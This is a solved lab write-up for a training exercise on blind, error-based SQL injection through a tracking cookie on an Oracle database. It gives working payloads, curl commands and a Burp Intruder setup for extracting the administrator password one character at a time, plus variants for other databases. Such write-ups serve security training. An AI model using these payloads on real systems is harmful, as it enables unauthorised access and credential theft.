# Blind SQL injection with conditional errors — Practitioner

**Status:** Solved

---

## Goal

Exploit a blind SQL injection vulnerability where the application doesn't show query results or change visible behavior, but does display database errors. Extract the administrator's password by triggering conditional errors.

---

## Steps (simple & complete)

1. **Find the injection point**
   - The vulnerability is in the tracking cookie
   - Check cookies:
```
   Cookie: TrackingId=xyz123abc
```
   - This cookie value is vulnerable to SQL injection

2. **Test for SQL injection with errors**
   - Inject syntax that causes an error:
```
   TrackingId=xyz123'
```
   - You should see a 500 Internal Server Error or similar
   
   - Inject valid syntax:
```
   TrackingId=xyz123''
```
   - Page loads normally (200 OK)

3. **Identify the database type (likely Oracle)**
   - Test Oracle-specific syntax:
```
   TrackingId=xyz123'||(SELECT '' FROM dual)||'
```
   - If page loads normally, it's Oracle

4. **Create conditional error technique**
   - Use Oracle's `CASE` statement to trigger errors conditionally:
```sql
   '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
   - When condition is TRUE → Division by zero error (500)
   - When condition is FALSE → No error (200 OK)

5. **Verify the users table exists**
   - Test if users table is accessible:
```
   TrackingId=xyz123'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1)||'
```
   - Should trigger error (confirms table exists)

6. **Confirm administrator user exists**
   - Test for username 'administrator':
```
   TrackingId=xyz123'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
   - Error means user exists

7. **Find password length**
   - Test different lengths:
```
   TrackingId=xyz123'||(SELECT CASE WHEN LENGTH(password)>19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
   - Error = TRUE (length > 19)
   - No error = FALSE (length <= 19)
   - Binary search: Try >10, >15, >20, then =20, =19...
   - Let's say password is 20 characters

8. **Extract password character by character**
   - Use SUBSTR to check each character:
```
   TrackingId=xyz123'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
   - Error = character is 'a'
   - No error = character is not 'a'

9. **Manual extraction example**

   Position 1 - test 'a':
```bash
   curl -H "Cookie: TrackingId=xyz123'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" https://TARGET
   # 200 OK → wrong character
```
   
   Position 1 - test 'p':
```bash
   curl -H "Cookie: TrackingId=xyz123'||(SELECT CASE WHEN SUBSTR(password,1,1)='p' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" https://TARGET
   # 500 Error → correct! First char is 'p'
```

10. **Automate with Burp Intruder**
    
    **Setup payload positions:**
```
    TrackingId=xyz123'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
    
    **Payload sets:**
    - Set 1: Numbers 1-20 (character position)
    - Set 2: a-z, 0-9 (characters to test)
    
    **Settings:**
    - Grep - Match: Look for 500 status code
    - When 500 appears, that's the correct character

11. **Build the complete password**
    - Character 1: p
    - Character 2: a
    - Character 3: s
    - Character 4: s
    - ... (continue for all 20 characters)
    - Final password: `passw0rdexample12345`

12. **Log in as administrator**
    - Navigate to login page
    - Username: `administrator`
    - Password: (extracted password)
    - Click "Log in"
    - Lab solves automatically

---

## Example

**Testing conditional errors:**
```
True condition (triggers error):
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Response: 500 Internal Server Error

False condition (no error):
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Response: 200 OK
```

**Extracting first character:**
```
Test 'a':
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
→ 200 OK (wrong)

Test 'p':
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='p' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
→ 500 Error (correct!) → First character is 'p'
```

---

## Oracle-specific syntax explained

**String concatenation:**
```sql
'||expression||'
```
- `||` is Oracle's concatenation operator
- Embeds our injection into the query

**CASE statement:**
```sql
CASE WHEN condition THEN result1 ELSE result2 END
```
- If condition TRUE → execute result1
- If condition FALSE → execute result2

**Triggering errors:**
```sql
TO_CHAR(1/0)
```
- Division by zero causes Oracle error
- `TO_CHAR()` wraps it (needed for string context)
- Alternative: `SELECT 1 FROM nonexistent_table`

**FROM dual:**
```sql
FROM dual
```
- Oracle requires FROM clause
- `dual` is dummy table with one row
- Always exists in Oracle databases

**SUBSTR function:**
```sql
SUBSTR(password,1,1)
```
- Extract substring from password
- Position 1, length 1
- Gets single character at a time

---

## Why this technique works

**Error-based blind SQLi:**
- Application doesn't show query results
- No visible behavior change like "Welcome back"
- But database errors leak to the application
- HTTP status codes reveal TRUE/FALSE

**Information channel:**
- TRUE condition → 500 Error
- FALSE condition → 200 OK
- Binary signal is enough to extract data
- Just like morse code (dots and dashes)

**Conditional error logic:**
```
IF (our_condition) THEN
    cause_error()  -- Trigger division by zero
ELSE
    do_nothing()   -- Return empty string
END
```

---

## Different database approaches

**Oracle (this lab):**
```sql
CASE WHEN condition THEN TO_CHAR(1/0) ELSE '' END
```

**MySQL:**
```sql
IF(condition, (SELECT 1 FROM nonexistent), '')
```

**PostgreSQL:**
```sql
CASE WHEN condition THEN CAST(1/0 AS TEXT) ELSE '' END
```

**MSSQL:**
```sql
CASE WHEN condition THEN 1/0 ELSE 0 END
```

---

## Optimization tips

**Use binary search for characters:**
```sql
-- Instead of testing a-z linearly
SUBSTR(password,1,1)>'m'  -- Splits alphabet in half
```
- Reduces 36 tests per character to ~6 tests
- Much faster extraction

**Test password length first:**
- Knowing length saves time
- Can allocate extraction array properly
- No wasted requests on non-existent positions

**Burp Intruder is essential:**
- Manual extraction takes forever
- Automated testing is much faster
- Can run multiple positions in parallel
- Set proper delays to avoid rate limiting

---

## Troubleshooting

**No errors appearing:**
- Check if database is Oracle (try FROM dual)
- Verify error message reaches you (not caught by app)
- Try different error-triggering methods
- Check for WAF blocking malicious queries

**All queries error:**
- Syntax might be wrong
- Check quote escaping
- Verify CASE statement structure
- Test with simpler query first

**Errors but can't extract data:**
- Confirm table/column names are correct
- Check if username is 'administrator' (not 'admin')
- Verify SUBSTR positions (1-indexed, not 0)

---

